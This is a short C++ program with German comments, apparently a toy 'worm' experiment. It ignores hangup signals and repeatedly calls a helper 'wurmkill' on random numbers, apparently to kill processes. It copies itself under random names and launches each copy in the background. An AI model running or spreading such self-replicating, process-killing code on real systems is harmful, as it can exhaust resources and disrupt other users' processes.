#include <unistd.h>
#include <time.h>
#include <stdlib.h>
#include <iostream>
#include <signal.h>

using namespace std;

int aktpid;

char randomname[21];
extern void execute(char*);
extern void getrandomname();

int main(int argc, char *argv[])
{
        signal(SIGHUP, SIG_IGN);
        aktpid = getpid();
        srand((unsigned)time(NULL) * aktpid);

        int g = 0;
        int h = 0;

        // Agressionstrieb & Vermehrung
        char ckill[17] = "wurmkill       &";
        char ccopy[47] = "wcpy                                          ";
        while(rand()%5)
        {
                h++;
                ckill[9]=char(48+(rand()%4));
                for(int j=10; j < 14; j++) ckill[j]=char(48+(rand()%10));
                cout<<aktpid<<"| "<<argv[0]<<"| Ausgeführt: "<<ckill<<endl;
                system(ckill);
                g++;
                cout<<aktpid<<"| "<<argv[0]<<"| Reprod. "<<g<<" Anfang"<<endl;
                getrandomname();
                for(int j=5; j < 25; j++) ccopy[j]=argv[0][j-3];
                for(int j=26; j < 46; j++) ccopy[j]=randomname[j-26];
                system(ccopy);
                execute(randomname);
                cout<<aktpid<<"| "<<argv[0]<<"| Reprod. "<<g<<" Ende"<<endl;
        }

        cout<<aktpid<<"| "<<argv[0]<<"| Gestorben nach "<<g<<" Reprod. und "<<
              h<<" Kills"<<endl;

        return 0;
}


void getrandomname()
{
     for (int c=0; c<20; c++) randomname[c] = char( 97+(rand()%26) );
}


void execute(char* dest)
{
        int i;

        char command1[33] = "chmod a+x                       ";
        for (i=0; i<20; i++) command1[10+i]= dest[i];
        system(command1);

        char command2[25] = "./                     &";
        for (i=0; i<20; i++) command2[2+i]= dest[i];
        system(command2);
}

